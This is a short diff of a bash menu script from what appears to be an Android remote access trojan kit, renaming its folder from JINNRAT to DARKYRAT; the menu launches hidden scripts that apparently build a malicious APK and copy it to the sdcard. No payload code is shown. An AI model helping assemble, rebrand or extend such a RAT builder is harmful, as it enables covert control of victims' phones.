@@ -38,21 +38,21 @@ echo
 
    if [ $ch -eq 1 ];then
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .JINN
 
         exit
     elif [ $ch -eq 2 ];then
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .BuildAPK
 
         exit
     elif [ $ch -eq 3 ];then
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .setup
 
@@ -60,7 +60,7 @@ echo
     elif [ $ch -eq 4 ];then
         echo -e "\e[1;31m 😈 Apk copy sdcard Please check...📌"
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .sdapk
 
